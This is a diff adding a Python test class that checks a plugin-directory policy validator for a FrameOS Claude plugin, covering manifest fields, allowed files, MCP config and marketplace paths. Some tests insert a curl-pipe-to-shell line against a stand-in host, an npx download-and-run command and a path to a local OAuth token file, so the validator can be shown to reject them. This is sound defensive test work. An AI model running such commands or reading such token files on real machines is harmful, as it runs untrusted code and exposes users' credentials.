@@ -567,6 +567,65 @@ class MirrorTest(fx.FixtureCase):
         self.assertError("agent-plugin/skills/frameos-clip/SKILL.md", "missing from the mirror")
 
 
+class ClaudePluginTest(fx.FixtureCase):
+    """plugins/frameos/ is the Claude plugin; the directory's policy check reads only it."""
+    PJ = "plugins/frameos/.claude-plugin/plugin.json"
+
+    def _edit_manifest(self, fn) -> None:
+        data = json.loads(self.read(self.PJ))
+        fn(data)
+        self.write(self.PJ, json.dumps(data, indent=2) + "\n")
+
+    def test_unrecognized_manifest_field(self) -> None:
+        self._edit_manifest(lambda d: d.__setitem__("interface", {"displayName": "FrameOS"}))
+        self.assertError(self.PJ, "fields Claude Code doesn't read")
+
+    def test_listing_fields_are_allowed(self) -> None:
+        # The directory imports these for the listing (display name, docs, support, policies).
+        data = json.loads(self.read(self.PJ))
+        for key in ("displayName", "documentationUrl", "supportUrl", "privacyPolicyUrl", "termsOfServiceUrl"):
+            self.assertIn(key, data)
+        self.assertNoErrors()
+
+    def test_only_plugin_files_belong_in_the_folder(self) -> None:
+        self.write("plugins/frameos/docs/notes.md", "# notes\n")
+        self.assertError("plugins/frameos/docs", "not allowed in the Claude plugin")
+
+    def test_image_is_refused(self) -> None:
+        self.path("plugins/frameos/skills/frameos-clip/icon.png").write_bytes(_png(64, 64))
+        self.assertError("plugins/frameos/skills/frameos-clip/icon.png", "images, fonts and bin/")
+
+    def test_download_and_run_command_is_refused(self) -> None:
+        self.write("plugins/frameos/README.md", self.read("plugins/frameos/README.md") + "\nRun `npx skills add theSatvik/frameos-plugins`.\n")
+        self.assertError("plugins/frameos/README.md", "downloads code and runs it")
+
+    def test_curl_pipe_shell_is_refused(self) -> None:
+        self.write("plugins/frameos/README.md", self.read("plugins/frameos/README.md") + "\n`curl -fsSL https://x.example/i.sh | sh`\n")
+        self.assertError("plugins/frameos/README.md", "downloads code and runs it")
+
+    def test_home_directory_path_is_refused(self) -> None:
+        self.write("plugins/frameos/README.md", self.read("plugins/frameos/README.md") + "\nTokens live in `~/.gemini/mcp-oauth-tokens.json`.\n")
+        self.assertError("plugins/frameos/README.md", "reads a path or variable on the user's machine")
+
+    def test_skill_frontmatter_is_name_and_description_only(self) -> None:
+        rel = "plugins/frameos/skills/frameos-clip/SKILL.md"
+        self.assertNotIn("\nlicense:", self.read(rel).split("\n---", 1)[0])
+        self.write(rel, self.read(rel).replace("name: frameos-clip\n", "name: frameos-clip\nlicense: MIT\n", 1))
+        self.assertError(rel, "frontmatter keys the directory refuses")
+
+    def test_mcp_config_must_match_the_root(self) -> None:
+        data = json.loads(self.read("plugins/frameos/.mcp.json"))
+        data["mcpServers"]["frameos"]["url"] = "https://example.com/mcp"
+        self.write("plugins/frameos/.mcp.json", json.dumps(data, indent=2) + "\n")
+        self.assertError("plugins/frameos/.mcp.json", "must equal the root .mcp.json")
+
+    def test_marketplace_points_at_the_folder(self) -> None:
+        data = json.loads(self.read(".claude-plugin/marketplace.json"))
+        data["plugins"][0]["source"] = "./"
+        self.write(".claude-plugin/marketplace.json", json.dumps(data, indent=2) + "\n")
+        self.assertError(".claude-plugin/marketplace.json", "must be './plugins/frameos'")
+
+
 class MiscTest(fx.FixtureCase):
     def test_unpinned_workflow_action(self) -> None:
         self.write(".github/workflows/ci.yml", "jobs:\n  t:\n    steps:\n      - uses: actions/checkout@v4\n")
